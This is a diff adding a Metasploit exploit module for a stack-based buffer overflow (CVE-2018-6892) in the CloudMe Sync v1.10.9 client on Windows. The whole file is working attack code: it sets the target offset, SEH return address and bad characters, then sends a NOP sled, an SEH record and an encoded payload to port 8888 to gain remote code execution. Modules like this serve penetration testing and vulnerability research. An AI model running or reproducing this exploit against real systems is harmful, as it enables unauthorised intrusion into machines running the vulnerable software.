@@ -1,0 +1,67 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CloudMe Sync v1.10.9',
+      'Description'    => %q{
+        This module exploits a stack-based buffer overflow vulnerability
+        in CloudMe Sync v1.10.9 client application. This module has been
+        tested successfully on Windows 7 SP1 x86.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'hyp3rlinx',      # Original exploit author
+          'Daniel Teixeira' # MSF module author
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2018-6892'],
+          [ 'EDB', '44027' ],
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00",
+        },
+      'Targets'        =>
+        [
+          [ 'CloudMe Sync v1.10.9',
+            {
+              'Offset' => 2232,
+              'Ret'    => 0x61e7b7f6
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Jan 17 2018',
+      'DefaultTarget'  => 0))
+
+    register_options([Opt::RPORT(8888)])
+
+  end
+
+  def exploit
+    connect
+
+    buffer = make_nops(target['Offset'])
+    buffer << generate_seh_record(target.ret)
+    buffer << payload.encoded
+
+    sock.put(buffer)
+    handler
+  end
+end
